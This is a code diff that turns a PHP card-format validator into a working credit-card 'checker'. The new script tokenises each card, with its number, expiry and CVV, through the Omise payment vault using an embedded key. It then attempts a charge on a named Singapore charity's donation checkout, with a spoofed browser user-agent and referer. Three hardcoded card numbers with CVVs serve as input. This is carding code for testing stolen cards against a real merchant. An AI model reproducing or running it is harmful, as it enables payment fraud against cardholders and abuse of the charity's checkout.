@@ -1,45 +1,88 @@
 <?php
-header('Content-Type: application/json');
 
-// Get the JSON input from the POST request
-$data = json_decode(file_get_contents('php://input'), true);
+// Function to make a POST request
+function makePostRequest($url, $headers, $data) {
+    $ch = curl_init($url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+    $response = curl_exec($ch);
+    curl_close($ch);
+    return $response;
+}
 
-$cc_list = $data['cc_list'] ?? [];
+// Function to check a single credit card
+function checkCard($ccNumber, $expMonth, $expYear, $cvv) {
+    $tokenUrl = "https://vault.omise.co/tokens";
+    $checkoutUrl = "https://givenow.gb.org.sg/index.php?route=extension/payment/omise/checkout";
 
-// Initialize an array to hold the results
-$results = [];
+    // Step 1: Create a token using the card details
+    $cardData = array(
+        "card" => array(
+            "name" => "Test User",
+            "number" => $ccNumber,
+            "expiration_month" => $expMonth,
+            "expiration_year" => $expYear,
+            "security_code" => $cvv
+        )
+    );
+    $jsonCardData = json_encode($cardData);
 
-foreach ($cc_list as $cc_entry) {
-    // Split the card details
-    $card_data = explode('|', $cc_entry);
-    
-    if (count($card_data) != 4) {
-        $results[] = ['message' => 'Invalid format: ' . $cc_entry];
-        continue;
-    }
+    // Headers for the token request
+    $tokenHeaders = array(
+        'Content-Type: application/json',
+        'Authorization: Basic cGtleV81b2wzanF0ZW16ZHJwemM2OXV6Og==',
+        'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',
+    );
 
-    $cc_number = trim($card_data[0]);
-    $cc_expiry_month = trim($card_data[1]);
-    $cc_expiry_year = trim($card_data[2]);
-    $cc_cvv = trim($card_data[3]);
+    $tokenResponse = makePostRequest($tokenUrl, $tokenHeaders, $jsonCardData);
+    $tokenData = json_decode($tokenResponse, true);
 
-    // Validate the card data
-    if (validate_card($cc_number, $cc_expiry_month, $cc_expiry_year, $cc_cvv)) {
-        $results[] = ['message' => 'Card is valid: ' . $cc_number];
+    if (isset($tokenData['id'])) {
+        $omiseToken = $tokenData['id'];
+
+        // Step 2: Use the token to attempt a checkout
+        $checkoutData = http_build_query(array(
+            'omise_token' => $omiseToken,
+            'description' => 'Charge a card from OpenCart'
+        ));
+
+        // Headers for the checkout request
+        $checkoutHeaders = array(
+            'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
+            'X-Requested-With: XMLHttpRequest',
+            'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',
+            'Referer: https://givenow.gb.org.sg/checkout'
+        );
+
+        $checkoutResponse = makePostRequest($checkoutUrl, $checkoutHeaders, $checkoutData);
+        return json_decode($checkoutResponse, true);
     } else {
-        $results[] = ['message' => 'Card is invalid: ' . $cc_number];
+        return array("status" => "error", "message" => "Token creation failed", "details" => $tokenData);
     }
 }
 
-echo json_encode($results);
-
-function validate_card($cc_number, $cc_expiry_month, $cc_expiry_year, $cc_cvv) {
-    // Example simple validation
-    if (strlen($cc_number) != 16 || strlen($cc_cvv) != 3 || !preg_match('/^\d{2}$/', $cc_expiry_month) || !preg_match('/^\d{2}$/', $cc_expiry_year)) {
-        return false;
+// Function to process multiple credit cards
+function checkMultipleCards($cards) {
+    $results = [];
+    foreach ($cards as $card) {
+        list($ccNumber, $expMonth, $expYear, $cvv) = explode('|', $card);
+        $result = checkCard(trim($ccNumber), trim($expMonth), trim($expYear), trim($cvv));
+        $results[] = $result;
     }
-
-    // In a real scenario, you'd call an API or check against a database
-    return true;
+    return $results;
 }
+
+// Input: List of cards
+$cardsInput = "4147098457625952|09|2027|036\n4147098457625953|10|2026|123\n4147098457625954|08|2028|456";
+$cards = explode("\n", $cardsInput);
+
+// Process the cards
+$results = checkMultipleCards($cards);
+
+// Output the results
+header('Content-Type: application/json');
+echo json_encode($results, JSON_PRETTY_PRINT);
+
 ?>
